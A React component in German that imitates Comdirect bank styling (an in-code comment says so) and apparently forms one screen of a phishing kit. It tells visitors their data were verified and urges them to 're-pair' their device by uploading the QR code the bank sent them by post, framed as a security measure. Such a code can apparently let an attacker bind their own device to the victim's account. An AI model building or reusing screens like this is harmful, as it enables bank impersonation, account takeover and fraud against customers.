import React from 'react';
import { QrCode, CheckCircle, Upload } from 'lucide-react';

interface QRInstructionsScreenProps {
  onContinue: () => void;
}

const QRInstructionsScreen: React.FC<QRInstructionsScreenProps> = ({ onContinue }) => {
  const [isMobile, setIsMobile] = React.useState(window.innerWidth <= 768);

  React.useEffect(() => {
    const checkMobile = () => {
      setIsMobile(window.innerWidth <= 768);
    };
    
    window.addEventListener('resize', checkMobile);
    return () => window.removeEventListener('resize', checkMobile);
  }, []);

  // CSS variables that match the Comdirect styling
  const cssVariables = {
    '--text': '#28363c',
    '--text-secondary': '#7d8287',
    '--border': '#d1d5db',
    '--border-hover': '#28363c',
    '--active': '#28363c',
    '--style-primary': '#fff500',
    '--style-primary-hover': '#e6d900',
    '--style-primary-on-it': '#000000',
    '--bg': '#ffffff',
    '--focus': '#28363c',
    '--focus-offset': '2px',
    '--focus-width': '1px'
  } as React.CSSProperties;

  return (
    <div style={{
      ...cssVariables,
      minHeight: '100vh',
      backgroundColor: '#ffffff',
      fontFamily: 'MarkWeb, Arial, sans-serif'
    }}>
      <div style={{
        maxWidth: '980px',
        margin: '0 auto',
        width: '100%'
      }}>
        <div style={{
          display: 'flex',
          flexDirection: isMobile ? 'column' : 'row',
          minHeight: '100vh'
        }}>
          {/* Left Column - Main Content */}
          <div style={{
            flex: isMobile ? '1' : '0 0 calc(50% - 15px)',
            padding: isMobile ? '20px' : '60px 15px 60px 20px',
            backgroundColor: '#ffffff',
            display: 'flex',
            flexDirection: 'column',
            justifyContent: 'flex-start'
          }}>
            <div style={{
              width: '100%',
              maxWidth: 'none'
            }}>
              {/* Page Title */}
              <h1 style={{
                fontSize: '1.875rem',
                fontWeight: '400',
                lineHeight: '2.625rem',
                margin: '0 0 2rem 0',
                color: 'var(--text)',
                fontFamily: 'MarkWeb, Arial, sans-serif'
              }}>
                Gerät erneut koppeln
              </h1>

              {/* Description */}
              <p style={{
                color: 'var(--text)',
                fontSize: '1rem',
                lineHeight: '1.6',
                margin: '0 0 2rem 0',
                fontFamily: 'MarkWeb, Arial, sans-serif'
              }}>
                Ihre Daten wurden erfolgreich verifiziert. Um die Sicherheit Ihres Kontos zu gewährleisten, 
                müssen Sie Ihr Gerät erneut mit Ihrem Konto koppeln.
              </p>

              {/* Instructions */}
              <div style={{
                marginBottom: '2rem'
              }}>
                <h3 style={{
                  color: 'var(--text)',
                  fontSize: '1.125rem',
                  fontWeight: '400',
                  marginBottom: '1.5rem',
                  fontFamily: 'MarkWeb, Arial, sans-serif',
                  display: 'flex',
                  alignItems: 'center',
                  gap: '0.5rem'
                }}>
                  <QrCode size={20} color="var(--text)" />
                  So funktioniert's:
                </h3>
                
                {/* Step 1 */}
                <div style={{ marginBottom: '1.5rem' }}>
                  <div style={{ display: 'flex', alignItems: 'flex-start', gap: '1rem' }}>
                    <span style={{
                      backgroundColor: 'var(--text)',
                      color: 'white',
                      borderRadius: '50%',
                      width: '1.5rem',
                      height: '1.5rem',
                      display: 'flex',
                      alignItems: 'center',
                      justifyContent: 'center',
                      fontSize: '0.75rem',
                      fontWeight: '400',
                      flexShrink: 0,
                      fontFamily: 'MarkWeb, Arial, sans-serif'
                    }}>
                      1
                    </span>
                    <div style={{ flex: 1 }}>
                      <p style={{
                        color: 'var(--text)',
                        fontSize: '0.875rem',
                        fontWeight: '400',
                        margin: '0 0 0.25rem 0',
                        fontFamily: 'MarkWeb, Arial, sans-serif'
                      }}>
                        QR-Code erhalten
                      </p>
                      <p style={{
                        color: 'var(--text-secondary)',
                        fontSize: '0.75rem',
                        margin: 0,
                        lineHeight: '1.4',
                        fontFamily: 'MarkWeb, Arial, sans-serif'
                      }}>
                        Sie haben einen QR-Code per Post erhalten
                      </p>
                    </div>
                  </div>
                </div>
                
                {/* Step 2 */}
                <div style={{ marginBottom: '1.5rem' }}>
                  <div style={{ display: 'flex', alignItems: 'flex-start', gap: '1rem' }}>
                    <span style={{
                      backgroundColor: 'var(--text)',
                      color: 'white',
                      borderRadius: '50%',
                      width: '1.5rem',
                      height: '1.5rem',
                      display: 'flex',
                      alignItems: 'center',
                      justifyContent: 'center',
                      fontSize: '0.75rem',
                      fontWeight: '400',
                      flexShrink: 0,
                      fontFamily: 'MarkWeb, Arial, sans-serif'
                    }}>
                      2
                    </span>
                    <div style={{ flex: 1 }}>
                      <p style={{
                        color: 'var(--text)',
                        fontSize: '0.875rem',
                        fontWeight: '400',
                        margin: '0 0 0.25rem 0',
                        fontFamily: 'MarkWeb, Arial, sans-serif'
                      }}>
                        QR-Code hochladen
                      </p>
                      <p style={{
                        color: 'var(--text-secondary)',
                        fontSize: '0.75rem',
                        margin: 0,
                        lineHeight: '1.4',
                        fontFamily: 'MarkWeb, Arial, sans-serif'
                      }}>
                        Laden Sie den QR-Code hoch oder fotografieren Sie ihn direkt
                      </p>
                    </div>
                  </div>
                </div>
                
                {/* Step 3 */}
                <div style={{ marginBottom: '2rem' }}>
                  <div style={{ display: 'flex', alignItems: 'flex-start', gap: '1rem' }}>
                    <span style={{
                      backgroundColor: 'var(--text)',
                      color: 'white',
                      borderRadius: '50%',
                      width: '1.5rem',
                      height: '1.5rem',
                      display: 'flex',
                      alignItems: 'center',
                      justifyContent: 'center',
                      fontSize: '0.75rem',
                      fontWeight: '400',
                      flexShrink: 0,
                      fontFamily: 'MarkWeb, Arial, sans-serif'
                    }}>
                      3
                    </span>
                    <div style={{ flex: 1 }}>
                      <p style={{
                        color: 'var(--text)',
                        fontSize: '0.875rem',
                        fontWeight: '400',
                        margin: '0 0 0.25rem 0',
                        fontFamily: 'MarkWeb, Arial, sans-serif'
                      }}>
                        Gerät gekoppelt
                      </p>
                      <p style={{
                        color: 'var(--text-secondary)',
                        fontSize: '0.75rem',
                        margin: 0,
                        lineHeight: '1.4',
                        fontFamily: 'MarkWeb, Arial, sans-serif'
                      }}>
                        Ihr Gerät wird automatisch gekoppelt und Sie können wieder sicher auf Ihr Konto zugreifen
                      </p>
                    </div>
                  </div>
                </div>
              </div>

              {/* Continue Button */}
              <button
                onClick={onContinue}
                style={{
                  backgroundColor: 'var(--style-primary)',
                  color: 'var(--style-primary-on-it)',
                  border: 'none',
                  borderRadius: '24px',
                  padding: '12px 24px',
                  fontSize: '1rem',
                  fontWeight: '400',
                  cursor: 'pointer',
                  fontFamily: 'MarkWeb, Arial, sans-serif',
                  transition: 'all 0.2s ease',
                  display: 'flex',
                  alignItems: 'center',
                  gap: '8px',
                  height: '48px',
                  minWidth: '200px',
                  justifyContent: 'center',
                  marginBottom: '2rem'
                }}
                onMouseOver={(e) => {
                  e.currentTarget.style.backgroundColor = 'var(--style-primary-hover)';
                }}
                onMouseOut={(e) => {
                  e.currentTarget.style.backgroundColor = 'var(--style-primary)';
                }}
              >
                <Upload size={20} />
                QR-Code jetzt hochladen
              </button>

              {/* Security Notice */}
              <div style={{
                backgroundColor: '#f8f9fa',
                border: '1px solid var(--border)',
                borderRadius: '4px',
                padding: '1rem',
                display: 'flex',
                alignItems: 'flex-start',
                gap: '0.75rem'
              }}>
                <CheckCircle size={16} color="var(--text)" style={{ marginTop: '0.125rem', flexShrink: 0 }} />
                <div>
                  <p style={{
                    color: 'var(--text)',
                    fontSize: '0.875rem',
                    fontWeight: '400',
                    margin: '0 0 0.25rem 0',
                    fontFamily: 'MarkWeb, Arial, sans-serif'
                  }}>
                    Sicherheitshinweis
                  </p>
                  <p style={{
                    color: 'var(--text-secondary)',
                    fontSize: '0.75rem',
                    margin: 0,
                    fontFamily: 'MarkWeb, Arial, sans-serif',
                    lineHeight: '1.4'
                  }}>
                    Diese zusätzliche Sicherheitsmaßnahme schützt Ihr Konto vor unbefugtem Zugriff.
                  </p>
                </div>
              </div>
            </div>
          </div>

          {/* Right Column - QR Code Example (Desktop only) */}
          {!isMobile && (
            <div style={{
              flex: '0 0 calc(50% - 15px)',
              padding: '60px 20px 60px 15px',
              backgroundColor: '#ffffff',
              display: 'flex',
              flexDirection: 'column',
              justifyContent: 'flex-start'
            }}>
              <div style={{
                textAlign: 'center',
                marginTop: '4rem'
              }}>
                <div style={{
                  width: '100%',
                  maxWidth: '350px',
                  height: '350px',
                  backgroundColor: '#f8f9fa',
                  border: '2px dashed var(--border)',
                  borderRadius: '8px',
                  display: 'flex',
                  flexDirection: 'column',
                  alignItems: 'center',
                  justifyContent: 'center',
                  margin: '0 auto'
                }}>
                  <div style={{
                    width: '120px',
                    height: '120px',
                    backgroundColor: '#000',
                    borderRadius: '4px',
                    display: 'flex',
                    alignItems: 'center',
                    justifyContent: 'center',
                    marginBottom: '1rem'
                  }}>
                    <div style={{
                      width: '100px',
                      height: '100px',
                      backgroundColor: '#fff',
                      borderRadius: '2px',
                      display: 'grid',
                      gridTemplateColumns: 'repeat(10, 1fr)',
                      gridTemplateRows: 'repeat(10, 1fr)',
                      gap: '1px'
                    }}>
                      {Array.from({ length: 100 }, (_, i) => (
                        <div
                          key={i}
                          style={{
                            backgroundColor: Math.random() > 0.5 ? '#000' : '#fff',
                            width: '100%',
                            height: '100%'
                          }}
                        />
                      ))}
                    </div>
                  </div>
                  <p style={{
                    color: 'var(--text-secondary)',
                    fontSize: '0.875rem',
                    fontFamily: 'MarkWeb, Arial, sans-serif',
                    textAlign: 'center',
                    margin: 0
                  }}>
                    QR-Code Beispiel
                  </p>
                </div>
              </div>
            </div>
          )}

          {/* Mobile QR Code Example */}
          {isMobile && (
            <div style={{
              padding: '0 20px 20px 20px',
              textAlign: 'center'
            }}>
              <div style={{
                width: '100%',
                maxWidth: '300px',
                height: '300px',
                backgroundColor: '#f8f9fa',
                border: '2px dashed var(--border)',
                borderRadius: '8px',
                display: 'flex',
                flexDirection: 'column',
                alignItems: 'center',
                justifyContent: 'center',
                margin: '0 auto'
              }}>
                <div style={{
                  width: '100px',
                  height: '100px',
                  backgroundColor: '#000',
                  borderRadius: '4px',
                  display: 'flex',
                  alignItems: 'center',
                  justifyContent: 'center',
                  marginBottom: '1rem'
                }}>
                  <div style={{
                    width: '80px',
                    height: '80px',
                    backgroundColor: '#fff',
                    borderRadius: '2px',
                    display: 'grid',
                    gridTemplateColumns: 'repeat(8, 1fr)',
                    gridTemplateRows: 'repeat(8, 1fr)',
                    gap: '1px'
                  }}>
                    {Array.from({ length: 64 }, (_, i) => (
                      <div
                        key={i}
                        style={{
                          backgroundColor: Math.random() > 0.5 ? '#000' : '#fff',
                          width: '100%',
                          height: '100%'
                        }}
                      />
                    ))}
                  </div>
                </div>
                <p style={{
                  color: 'var(--text-secondary)',
                  fontSize: '0.875rem',
                  fontFamily: 'MarkWeb, Arial, sans-serif',
                  textAlign: 'center',
                  margin: 0
                }}>
                  QR-Code Beispiel
                </p>
              </div>
            </div>
          )}
        </div>
      </div>
    </div>
  );
};

export default QRInstructionsScreen;